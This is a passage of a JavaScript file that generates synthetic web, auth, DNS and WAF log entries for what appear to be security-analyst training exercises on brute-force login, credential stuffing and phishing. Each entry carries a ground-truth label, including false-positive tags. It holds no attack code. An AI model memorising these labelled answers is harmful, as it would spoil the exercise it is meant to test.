    { event: 'login_failure', user: 'admin', srcIp: '45.33.32.100', reason: 'invalid_password', attemptNum: 3 },
    true, 'brute-force');

  _at.e('08:06:39', 'web', 'info',
    '72.44.128.90 GET /products/monitors — 200 OK',
    null, false, null);

  _at.e('08:06:42', 'auth', 'warning',
    'Login failure user=admin from 45.33.32.100 — invalid password',
    { event: 'login_failure', user: 'admin', srcIp: '45.33.32.100', reason: 'invalid_password', attemptNum: 4 },
    true, 'brute-force');

  _at.e('08:06:45', 'auth', 'warning',
    'Login failure user=admin from 45.33.32.100 — invalid password',
    { event: 'login_failure', user: 'admin', srcIp: '45.33.32.100', reason: 'invalid_password', attemptNum: 5 },
    true, 'brute-force');

  _at.e('08:06:48', 'auth', 'warning',
    'Login failure user=admin from 45.33.32.100 — invalid password',
    { event: 'login_failure', user: 'admin', srcIp: '45.33.32.100', reason: 'invalid_password', attemptNum: 6 },
    true, 'brute-force');

  _at.e('08:06:50', 'web', 'info',
    '98.22.156.71 GET /dashboard/settings — 200 OK',
    null, false, null);

  _at.e('08:06:51', 'auth', 'warning',
    'Login failure user=admin from 45.33.32.100 — invalid password',
    { event: 'login_failure', user: 'admin', srcIp: '45.33.32.100', reason: 'invalid_password', attemptNum: 7 },
    true, 'brute-force');

  _at.e('08:06:54', 'auth', 'warning',
    'Login failure user=admin from 45.33.32.100 — invalid password',
    { event: 'login_failure', user: 'admin', srcIp: '45.33.32.100', reason: 'invalid_password', attemptNum: 8 },
    true, 'brute-force');

  _at.e('08:06:57', 'auth', 'warning',
    'Login failure user=admin from 45.33.32.100 — invalid password',
    { event: 'login_failure', user: 'admin', srcIp: '45.33.32.100', reason: 'invalid_password', attemptNum: 9 },
    true, 'brute-force');

  _at.e('08:07:00', 'auth', 'warning',
    'Login failure user=admin from 45.33.32.100 — invalid password',
    { event: 'login_failure', user: 'admin', srcIp: '45.33.32.100', reason: 'invalid_password', attemptNum: 10 },
    true, 'brute-force');

  _at.e('08:07:05', 'waf', 'high',
    'Brute force threshold: 10 failed logins from 45.33.32.100 in 35s',
    { srcIp: '45.33.32.100', rule: 'brute-force-threshold', action: 'ALERT', failCount: 10, windowSec: 35, targetUser: 'admin' },
    true, 'brute-force');

  /* ── Interleaved normal traffic ──────────────────── */

  _at.e('08:07:15', 'web', 'info',
    '203.0.113.42 GET /api/calendar — 200 OK',
    null, false, null);

  _at.e('08:07:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _at.e('08:07:45', 'web', 'info',
    '172.217.14.99 GET /blog — 200 OK — Googlebot/2.1',
    null, false, null);

  _at.e('08:08:00', 'waf', 'low',
    'Rate limit warning: 172.217.14.99 — 26 req/min (threshold 30)',
    null, false, null);

  /* ── Credential stuffing: attacker tries stolen cred ── */

  _at.e('08:08:30', 'auth', 'info',
    'Login success user=admin from 45.33.32.100',
    { event: 'login_success', user: 'admin', srcIp: '45.33.32.100', sessionId: 'sess_adm_x7f3', mfa: false },
    true, 'credential-stuffing');

  /* ── More normal traffic ─────────────────────────── */

  _at.e('08:08:45', 'web', 'info',
    '72.44.128.90 GET /checkout — 200 OK',
    null, false, null);

  _at.e('08:09:00', 'web', 'info',
    '98.22.156.71 POST /reports/export — 200 OK',
    { srcIp: '98.22.156.71', dstIp: '10.0.2.20', dstPort: 443, method: 'POST', path: '/reports/export', status: 200, bytes: 28400, userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)' },
    false, null);

  _at.e('08:09:15', 'waf', 'medium',
    'SQL injection pattern in query: 72.44.128.90 GET /search?q=DROP+shipping+options',
    { srcIp: '72.44.128.90', dstIp: '10.0.2.20', rule: 'sqli-detect-generic', action: 'LOG', method: 'GET', path: '/search?q=DROP+shipping+options', matchedPattern: 'DROP', riskScore: 20 },
    false, 'false-positive-sql');

  _at.e('08:09:30', 'web', 'info',
    '72.44.128.90 GET /search?q=DROP+shipping+options — 200 OK',
    null, false, null);

  /* ── Attacker accesses admin panel ───────────────── */

  _at.e('08:10:00', 'web', 'warning',
    '45.33.32.100 GET /admin/dashboard — 200 OK',
    { srcIp: '45.33.32.100', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/admin/dashboard', status: 200, bytes: 22100, userAgent: 'Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115.0', sessionId: 'sess_adm_x7f3' },
    true, 'unauthorized-access');

  _at.e('08:10:15', 'web', 'warning',
    '45.33.32.100 GET /admin/users — 200 OK',
    { srcIp: '45.33.32.100', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/admin/users', status: 200, bytes: 45800, userAgent: 'Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115.0', sessionId: 'sess_adm_x7f3' },
    true, 'unauthorized-access');

  _at.e('08:10:30', 'web', 'warning',
    '45.33.32.100 GET /admin/settings — 200 OK',
    { srcIp: '45.33.32.100', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/admin/settings', status: 200, bytes: 18700, userAgent: 'Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115.0', sessionId: 'sess_adm_x7f3' },
    true, 'unauthorized-access');

  /* ── Continued normal traffic ────────────────────── */

  _at.e('08:10:45', 'web', 'info',
    '203.0.113.42 POST /api/tasks — 201 Created',
    null, false, null);

  _at.e('08:11:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _at.e('08:11:15', 'auth', 'info',
    'Logout user=kmorales session=sess_km_33b1',
    null, false, null);

  _at.e('08:11:30', 'web', 'info',
    '72.44.128.90 POST /checkout/confirm — 200 OK',
    null, false, null);

  _at.e('08:11:45', 'web', 'info',
    '13.107.42.14 GET /blog/latest — 200 OK — bingbot/2.0',
    null, false, null);

  _at.e('08:12:00', 'waf', 'low',
    'Rate limit warning: 13.107.42.14 — 29 req/min (threshold 30)',
    { srcIp: '13.107.42.14', rule: 'rate-limit-soft', action: 'LOG', reqPerMin: 29, threshold: 30 },
    false, null);

  _at.e('08:12:15', 'web', 'info',
    '98.22.156.71 GET /api/notifications — 200 OK',
    null, false, null);

  _at.e('08:12:30', 'waf', 'medium',
    'SQL injection pattern in query: 203.0.113.42 GET /search?q=UNION+jack+flag+decor',
    { srcIp: '203.0.113.42', dstIp: '10.0.2.20', rule: 'sqli-detect-generic', action: 'LOG', method: 'GET', path: '/search?q=UNION+jack+flag+decor', matchedPattern: 'UNION', riskScore: 25 },
    false, 'false-positive-sql');

  _at.e('08:12:45', 'web', 'info',
    '203.0.113.42 GET /search?q=UNION+jack+flag+decor — 200 OK',
    null, false, null);

  _at.e('08:13:00', 'web', 'info',
    '72.44.128.90 GET /order/confirmation/ORD-8821 — 200 OK',
    null, false, null);

  _at.e('08:13:15', 'auth', 'info',
    'Logout user=jthompson session=sess_jt_01a2',
    null, false, null);

  _at.e('08:13:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _at.e('08:13:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    { srcIp: '91.189.92.10', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/api/metrics', status: 200, bytes: 8400, userAgent: 'prometheus/2.45' },
    false, null);

  _at.e('08:14:00', 'waf', 'medium',
    'XSS pattern in query: 98.22.156.71 GET /search?q=<script>+tag+art',
    { srcIp: '98.22.156.71', dstIp: '10.0.2.20', rule: 'xss-detect-generic', action: 'BLOCK', method: 'GET', path: '/search?q=<script>+tag+art', matchedPattern: '<script>', riskScore: 40 },
    false, 'misconfigured-rule');

  _at.e('08:14:15', 'web', 'info',
    '98.22.156.71 GET /search?q=script+tag+art — 200 OK',
    null, false, null);

  _at.e('08:14:30', 'web', 'info',
    '172.217.14.99 GET /products — 200 OK — Googlebot/2.1',
    null, false, null);

  _at.e('08:14:45', 'web', 'info',
    '203.0.113.42 GET /dashboard — 200 OK',
    null, false, null);

  _at.e('08:15:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _at.e('08:15:15', 'auth', 'info',
    'Login success user=jthompson from 72.44.128.90',
    null, false, null);

  _at.e('08:15:30', 'web', 'info',
    '72.44.128.90 GET /dashboard — 200 OK',
    null, false, null);

  _at.e('08:15:45', 'waf', 'low',
    'Rate limit warning: 172.217.14.99 — 27 req/min (threshold 30)',
    null, false, null);

  _at.e('08:16:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _at.e('08:16:15', 'web', 'info',
    '98.22.156.71 GET /reports/monthly — 200 OK',
    null, false, null);

  _at.e('08:16:30', 'web', 'info',
    '13.107.42.14 GET /contact — 200 OK — bingbot/2.0',
    null, false, null);

  _at.e('08:16:45', 'auth', 'info',
    'Logout user=mweber session=sess_mw_e81c',
    null, false, null);

  _at.e('08:17:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _at.e('08:17:15', 'web', 'info',
    '203.0.113.42 GET /api/tasks — 200 OK',
    null, false, null);

  _at.e('08:17:30', 'auth', 'info',
    'Login success user=mweber from 203.0.113.42',
    null, false, null);

  _at.e('08:17:45', 'web', 'info',
    '98.22.156.71 GET /dashboard — 200 OK',
    null, false, null);

  _at.e('08:18:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  var ALERT_TRIAGE = _at.entries;

  /* ════════════════════════════════════════════════════
     Phishing Analysis — 2024-04-10 10:00–12:00 UTC
     ════════════════════════════════════════════════════

     Attacker domain: acmecorp-login.xyz (93.184.216.34)
     Real domain:     login.acmecorp.lab (10.0.2.20)
     Compromised:     tlee, rgarcia, apatel
     Attacker reuse:  91.240.118.55 (uses stolen creds)
     Mail server:     10.0.3.10

     Normal users:
       72.44.128.90   — US east coast employee
       98.22.156.71   — US midwest employee
       203.0.113.42   — EU employee
       10.0.4.55      — health check
       91.189.92.10   — internal monitoring
       172.217.14.99  — Google crawler
     ════════════════════════════════════════════════════ */

  var _pa = makeCorpus('2024-04-10 ');

  /* ── Normal morning traffic ──────────────────────── */

  _pa.e('10:00:01', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    { srcIp: '10.0.4.55', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/api/health', status: 200, bytes: 48, userAgent: 'internal-monitor/1.0' },
    false, null);

  _pa.e('10:00:15', 'dns', 'info',
    'A query login.acmecorp.lab from 10.0.2.20',
    { queryType: 'A', domain: 'login.acmecorp.lab', srcIp: '10.0.2.20', response: '10.0.2.20', ttl: 300 },
    false, null);

  _pa.e('10:00:30', 'auth', 'info',
    'Login success user=jthompson from 72.44.128.90',
    { event: 'login_success', user: 'jthompson', srcIp: '72.44.128.90', sessionId: 'sess_jt_a001', mfa: true },
    false, null);

  _pa.e('10:00:45', 'web', 'info',
    '72.44.128.90 GET /dashboard — 200 OK',
    null, false, null);

  _pa.e('10:01:00', 'web', 'info',
    '98.22.156.71 GET / — 200 OK — Mozilla/5.0 (Macintosh)',
    null, false, null);

  _pa.e('10:01:15', 'auth', 'info',
    'Login success user=kmorales from 98.22.156.71',
    null, false, null);

  _pa.e('10:01:30', 'dns', 'info',
    'A query mail.acmecorp.lab from 10.0.3.10',
    null, false, null);

  _pa.e('10:01:45', 'web', 'info',
    '172.217.14.99 GET /robots.txt — 200 OK — Googlebot/2.1',
    null, false, null);

  _pa.e('10:02:00', 'web', 'info',
    '203.0.113.42 GET / — 200 OK — Mozilla/5.0 (X11; Linux x86_64)',
    { srcIp: '203.0.113.42', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/', status: 200, bytes: 14200, userAgent: 'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0', geo: 'DE' },
    false, null);

  _pa.e('10:02:15', 'auth', 'info',
    'Login success user=mweber from 203.0.113.42',
    null, false, null);

  _pa.e('10:02:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:02:45', 'auth', 'info',
    'OAuth token refresh user=jthompson — success',
    { event: 'oauth_refresh', user: 'jthompson', srcIp: '72.44.128.90', tokenId: 'tok_jt_4a1c', result: 'success' },
    false, null);

  _pa.e('10:03:00', 'web', 'info',
    '72.44.128.90 GET /api/notifications — 200 OK',
    null, false, null);

  _pa.e('10:03:15', 'dns', 'info',
    'A query cdn.acmecorp.lab from 10.0.2.20',
    null, false, null);

  _pa.e('10:03:30', 'web', 'info',
    '98.22.156.71 GET /reports/weekly — 200 OK',
    null, false, null);

  _pa.e('10:03:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    { srcIp: '91.189.92.10', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/api/metrics', status: 200, bytes: 8400, userAgent: 'prometheus/2.45' },
    false, null);

  _pa.e('10:04:00', 'web', 'info',
    '203.0.113.42 GET /projects/roadmap — 200 OK',
    null, false, null);

  _pa.e('10:04:15', 'auth', 'info',
    'Password reset requested user=dpark from 72.44.128.90',
    { event: 'password_reset_request', user: 'dpark', srcIp: '72.44.128.90', emailSent: true },
    false, null);

  _pa.e('10:04:30', 'dns', 'info',
    'MX query acmecorp.lab from 10.0.3.10',
    { queryType: 'MX', domain: 'acmecorp.lab', srcIp: '10.0.3.10', response: 'mail.acmecorp.lab', ttl: 3600 },
    false, null);

  _pa.e('10:04:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:05:00', 'auth', 'info',
    'Password reset completed user=dpark from 72.44.128.90',
    null, false, null);

  _pa.e('10:05:15', 'web', 'info',
    '98.22.156.71 POST /api/tasks — 201 Created',
    null, false, null);

  _pa.e('10:05:30', 'web', 'info',
    '172.217.14.99 GET /about — 200 OK — Googlebot/2.1',
    null, false, null);

  _pa.e('10:05:45', 'dns', 'info',
    'A query api.slack.com from 10.0.2.20',
    null, false, null);

  _pa.e('10:06:00', 'web', 'info',
    '203.0.113.42 GET /api/calendar — 200 OK',
    null, false, null);

  /* ── Phishing campaign begins — look-alike domain ── */

  _pa.e('10:06:30', 'dns', 'info',
    'A query acmecorp-login.xyz from 10.0.5.12',
    { queryType: 'A', domain: 'acmecorp-login.xyz', srcIp: '10.0.5.12', response: '93.184.216.34', ttl: 60 },
    true, 'look-alike-dns');

  _pa.e('10:06:45', 'waf', 'info',
    'Outbound request to acmecorp-login.xyz from 10.0.5.12',
    { srcIp: '10.0.5.12', dstIp: '93.184.216.34', dstPort: 443, rule: 'outbound-https', action: 'ALLOW', domain: 'acmecorp-login.xyz' },
    true, 'phishing-domain');

  _pa.e('10:07:00', 'dns', 'info',
    'A query acmecorp-login.xyz from 10.0.5.18',
    { queryType: 'A', domain: 'acmecorp-login.xyz', srcIp: '10.0.5.18', response: '93.184.216.34', ttl: 60 },
    true, 'look-alike-dns');

  _pa.e('10:07:15', 'web', 'info',
    '72.44.128.90 GET /dashboard/settings — 200 OK',
    null, false, null);

  _pa.e('10:07:30', 'waf', 'info',
    'Outbound request to acmecorp-login.xyz from 10.0.5.18',
    { srcIp: '10.0.5.18', dstIp: '93.184.216.34', dstPort: 443, rule: 'outbound-https', action: 'ALLOW', domain: 'acmecorp-login.xyz' },
    true, 'phishing-domain');

  _pa.e('10:07:45', 'web', 'info',
    '98.22.156.71 GET /api/notifications — 200 OK',
    null, false, null);

  _pa.e('10:08:00', 'dns', 'info',
    'A query acmecorp-login.xyz from 10.0.5.25',
    { queryType: 'A', domain: 'acmecorp-login.xyz', srcIp: '10.0.5.25', response: '93.184.216.34', ttl: 60 },
    true, 'look-alike-dns');

  _pa.e('10:08:15', 'waf', 'info',
    'Outbound request to acmecorp-login.xyz from 10.0.5.25',
    { srcIp: '10.0.5.25', dstIp: '93.184.216.34', dstPort: 443, rule: 'outbound-https', action: 'ALLOW', domain: 'acmecorp-login.xyz' },
    true, 'phishing-domain');

  /* ── Credential harvesting — employees enter creds ─ */

  _pa.e('10:08:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:08:45', 'auth', 'warning',
    'Login failure user=tlee from 93.184.216.34 — credential submitted to external host',
    { event: 'credential_harvest', user: 'tlee', srcIp: '10.0.5.12', dstIp: '93.184.216.34', domain: 'acmecorp-login.xyz', method: 'POST' },
    true, 'credential-harvest');

  _pa.e('10:09:00', 'auth', 'warning',
    'Login failure user=rgarcia from 93.184.216.34 — credential submitted to external host',
    { event: 'credential_harvest', user: 'rgarcia', srcIp: '10.0.5.18', dstIp: '93.184.216.34', domain: 'acmecorp-login.xyz', method: 'POST' },
    true, 'credential-harvest');

  _pa.e('10:09:15', 'web', 'info',
    '203.0.113.42 POST /api/tasks — 201 Created',
    null, false, null);

  _pa.e('10:09:30', 'auth', 'warning',
    'Login failure user=apatel from 93.184.216.34 — credential submitted to external host',
    { event: 'credential_harvest', user: 'apatel', srcIp: '10.0.5.25', dstIp: '93.184.216.34', domain: 'acmecorp-login.xyz', method: 'POST' },
    true, 'credential-harvest');

  _pa.e('10:09:45', 'dns', 'info',
    'A query updates.acmecorp.lab from 10.0.2.20',
    null, false, null);

  _pa.e('10:10:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _pa.e('10:10:15', 'auth', 'info',
    'OAuth token refresh user=kmorales — success',
    null, false, null);

  _pa.e('10:10:30', 'web', 'info',
    '72.44.128.90 POST /reports/generate — 200 OK',
    { srcIp: '72.44.128.90', dstIp: '10.0.2.20', dstPort: 443, method: 'POST', path: '/reports/generate', status: 200, bytes: 34200, userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' },
    false, null);

  _pa.e('10:10:45', 'web', 'info',
    '98.22.156.71 GET /dashboard — 200 OK',
    null, false, null);

  _pa.e('10:11:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:11:15', 'dns', 'info',
    'A query fonts.googleapis.com from 10.0.2.20',
    null, false, null);

  _pa.e('10:11:30', 'web', 'info',
    '203.0.113.42 GET /projects/backlog — 200 OK',
    null, false, null);

  _pa.e('10:11:45', 'auth', 'info',
    'VPN connect user=mweber from 203.0.113.42 — tunnel established',
    { event: 'vpn_connect', user: 'mweber', srcIp: '203.0.113.42', tunnelId: 'vpn_mw_11a', assignedIp: '10.10.0.15' },
    false, null);

  _pa.e('10:12:00', 'web', 'info',
    '172.217.14.99 GET /blog — 200 OK — Googlebot/2.1',
    null, false, null);

  _pa.e('10:12:15', 'web', 'info',
    '72.44.128.90 GET /api/notifications — 200 OK',
    null, false, null);

  _pa.e('10:12:30', 'dns', 'info',
    'A query cdn.acmecorp.lab from 10.0.2.20',
    null, false, null);

  /* ── Attacker uses stolen creds (30 min later) ───── */

  _pa.e('10:38:00', 'auth', 'info',
    'Login success user=tlee from 91.240.118.55',
    { event: 'login_success', user: 'tlee', srcIp: '91.240.118.55', sessionId: 'sess_tl_h8x2', mfa: false, geo: 'RU' },
    true, 'compromised-accounts');

  _pa.e('10:38:15', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:38:30', 'web', 'warning',
    '91.240.118.55 GET /admin/users — 200 OK',
    { srcIp: '91.240.118.55', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/admin/users', status: 200, bytes: 45800, userAgent: 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0', geo: 'RU' },
    true, 'lateral-movement');

  _pa.e('10:38:45', 'auth', 'info',
    'Login success user=rgarcia from 91.240.118.55',
    { event: 'login_success', user: 'rgarcia', srcIp: '91.240.118.55', sessionId: 'sess_rg_k4m1', mfa: false, geo: 'RU' },
    true, 'compromised-accounts');

  _pa.e('10:39:00', 'web', 'info',
    '98.22.156.71 GET /reports/monthly — 200 OK',
    null, false, null);

  _pa.e('10:39:15', 'web', 'warning',
    '91.240.118.55 GET /admin/settings — 200 OK',
    { srcIp: '91.240.118.55', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/admin/settings', status: 200, bytes: 18700, userAgent: 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0', geo: 'RU' },
    true, 'lateral-movement');

  _pa.e('10:39:30', 'auth', 'info',
    'Login success user=apatel from 91.240.118.55',
    { event: 'login_success', user: 'apatel', srcIp: '91.240.118.55', sessionId: 'sess_ap_w2n7', mfa: false, geo: 'RU' },
    true, 'compromised-accounts');

  _pa.e('10:39:45', 'web', 'info',
    '72.44.128.90 GET /dashboard — 200 OK',
    null, false, null);

  _pa.e('10:40:00', 'web', 'warning',
    '91.240.118.55 GET /api/users/export — 200 OK — 2.4MB',
    { srcIp: '91.240.118.55', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/api/users/export', status: 200, bytes: 2457600, userAgent: 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0', geo: 'RU' },
    true, 'lateral-movement');

  _pa.e('10:40:15', 'web', 'info',
    '203.0.113.42 GET /api/calendar — 200 OK',
    null, false, null);

  _pa.e('10:40:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:40:45', 'dns', 'info',
    'A query analytics.acmecorp.lab from 10.0.2.20',
    null, false, null);

  _pa.e('10:41:00', 'web', 'info',
    '98.22.156.71 GET /api/tasks — 200 OK',
    null, false, null);

  _pa.e('10:41:15', 'auth', 'info',
    'Logout user=jthompson session=sess_jt_a001',
    null, false, null);

  _pa.e('10:41:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _pa.e('10:41:45', 'dns', 'info',
    'A query graph.microsoft.com from 10.0.2.20',
    null, false, null);

  _pa.e('10:42:00', 'web', 'info',
    '172.217.14.99 GET /products — 200 OK — Googlebot/2.1',
    null, false, null);

  _pa.e('10:42:15', 'web', 'info',
    '72.44.128.90 GET /api/notifications — 200 OK',
    null, false, null);

  _pa.e('10:42:30', 'auth', 'info',
    'VPN connect user=jthompson from 72.44.128.90 — tunnel established',
    { event: 'vpn_connect', user: 'jthompson', srcIp: '72.44.128.90', tunnelId: 'vpn_jt_22b', assignedIp: '10.10.0.18' },
    false, null);

  _pa.e('10:42:45', 'web', 'info',
    '203.0.113.42 POST /api/tasks — 201 Created',
    null, false, null);

  _pa.e('10:43:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:43:15', 'web', 'info',
    '98.22.156.71 GET /dashboard/settings — 200 OK',
    null, false, null);

  _pa.e('10:43:30', 'dns', 'info',
    'A query login.microsoftonline.com from 10.0.2.20',
    null, false, null);

  _pa.e('10:43:45', 'auth', 'info',
    'OAuth token refresh user=mweber — success',
    null, false, null);

  _pa.e('10:44:00', 'web', 'info',
    '203.0.113.42 GET /reports/quarterly — 200 OK',
    null, false, null);

  _pa.e('10:44:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _pa.e('10:44:30', 'auth', 'info',
    'Logout user=kmorales session=sess_km_33b1',
    null, false, null);

  _pa.e('10:44:45', 'web', 'info',
    '72.44.128.90 GET /projects/roadmap — 200 OK',
    null, false, null);

  _pa.e('10:45:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:45:15', 'dns', 'info',
    'A query mail.acmecorp.lab from 10.0.3.10',
    null, false, null);

  _pa.e('10:45:30', 'web', 'info',
    '98.22.156.71 POST /reports/export — 200 OK',
    null, false, null);

  _pa.e('10:45:45', 'auth', 'info',
    'Login success user=kmorales from 98.22.156.71',
    null, false, null);

  _pa.e('10:46:00', 'web', 'info',
    '203.0.113.42 GET /api/notifications — 200 OK',
    null, false, null);

  _pa.e('10:46:15', 'web', 'info',
    '172.217.14.99 GET /blog/latest — 200 OK — Googlebot/2.1',
    null, false, null);

  _pa.e('10:46:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:46:45', 'auth', 'info',
    'VPN disconnect user=mweber tunnel=vpn_mw_11a',
    null, false, null);

  _pa.e('10:47:00', 'web', 'info',
    '72.44.128.90 POST /api/tasks — 201 Created',
    null, false, null);

  _pa.e('10:47:15', 'dns', 'info',
    'A query s3.amazonaws.com from 10.0.2.20',
    null, false, null);

  _pa.e('10:47:30', 'web', 'info',
    '98.22.156.71 GET /dashboard — 200 OK',
    null, false, null);

  _pa.e('10:47:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _pa.e('10:48:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:48:15', 'auth', 'info',
    'Logout user=mweber session=sess_mw_e81c',
    null, false, null);

  _pa.e('10:48:30', 'web', 'info',
    '203.0.113.42 GET /dashboard — 200 OK',
    null, false, null);

  _pa.e('10:48:45', 'web', 'info',
    '72.44.128.90 GET /reports/weekly — 200 OK',
    null, false, null);

  _pa.e('10:49:00', 'dns', 'info',
    'A query api.github.com from 10.0.2.20',
    null, false, null);

  _pa.e('10:49:15', 'web', 'info',
    '98.22.156.71 GET /api/notifications — 200 OK',
    null, false, null);

  _pa.e('10:49:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:49:45', 'auth', 'info',
    'Login success user=mweber from 203.0.113.42',
    null, false, null);

  _pa.e('10:50:00', 'web', 'info',
    '172.217.14.99 GET /contact — 200 OK — Googlebot/2.1',
    null, false, null);

  _pa.e('10:50:15', 'web', 'info',
    '72.44.128.90 GET /api/calendar — 200 OK',
    null, false, null);

  _pa.e('10:50:30', 'web', 'info',
    '203.0.113.42 POST /api/tasks — 201 Created',
    null, false, null);

  _pa.e('10:50:45', 'dns', 'info',
    'AAAA query login.acmecorp.lab from 10.0.2.20',
    null, false, null);

  _pa.e('10:51:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:51:15', 'web', 'info',
    '72.44.128.90 GET /projects/backlog — 200 OK',
    null, false, null);

  _pa.e('10:51:30', 'dns', 'info',
    'A query api.stripe.com from 10.0.2.20',
    null, false, null);

  _pa.e('10:51:45', 'web', 'info',
    '98.22.156.71 GET /api/tasks — 200 OK',
    null, false, null);

  _pa.e('10:52:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:52:15', 'auth', 'info',
    'OAuth token refresh user=kmorales — success',
    null, false, null);

  _pa.e('10:52:30', 'web', 'info',
    '203.0.113.42 GET /reports/annual — 200 OK',
    null, false, null);

  _pa.e('10:52:45', 'dns', 'info',
    'A query ocsp.digicert.com from 10.0.2.20',
    null, false, null);

  _pa.e('10:53:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _pa.e('10:53:15', 'web', 'info',
    '72.44.128.90 POST /api/tasks — 201 Created',
    null, false, null);

  _pa.e('10:53:30', 'web', 'info',
    '172.217.14.99 GET /products — 200 OK — Googlebot/2.1',
    null, false, null);

  _pa.e('10:53:45', 'web', 'info',
    '98.22.156.71 GET /dashboard/settings — 200 OK',
    null, false, null);

  _pa.e('10:54:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:54:15', 'auth', 'info',
    'Password reset requested user=bkim from 98.22.156.71',
    { event: 'password_reset_request', user: 'bkim', srcIp: '98.22.156.71', emailSent: true },
    false, null);

  _pa.e('10:54:30', 'dns', 'info',
    'A query sentry.io from 10.0.2.20',
    null, false, null);

  _pa.e('10:54:45', 'web', 'info',
    '203.0.113.42 GET /api/notifications — 200 OK',
    null, false, null);

  _pa.e('10:55:00', 'web', 'info',
    '72.44.128.90 GET /reports/daily — 200 OK',
    null, false, null);

  _pa.e('10:55:15', 'auth', 'info',
    'Password reset completed user=bkim from 98.22.156.71',
    null, false, null);

  _pa.e('10:55:30', 'dns', 'info',
    'A query api.datadog.com from 10.0.2.20',
    null, false, null);

  _pa.e('10:55:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _pa.e('10:56:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:56:15', 'web', 'info',
    '98.22.156.71 GET /api/calendar — 200 OK',
    null, false, null);

  _pa.e('10:56:30', 'auth', 'info',
    'VPN connect user=bkim from 98.22.156.71 — tunnel established',
    { event: 'vpn_connect', user: 'bkim', srcIp: '98.22.156.71', tunnelId: 'vpn_bk_01', assignedIp: '10.10.0.22' },
    false, null);

  _pa.e('10:56:45', 'web', 'info',
    '172.217.14.99 GET /blog/latest — 200 OK — Googlebot/2.1',
    null, false, null);

  _pa.e('10:57:00', 'web', 'info',
    '203.0.113.42 POST /reports/generate — 200 OK',
    null, false, null);

  _pa.e('10:57:15', 'dns', 'info',
    'A query fonts.gstatic.com from 10.0.2.20',
    null, false, null);

  _pa.e('10:57:30', 'web', 'info',
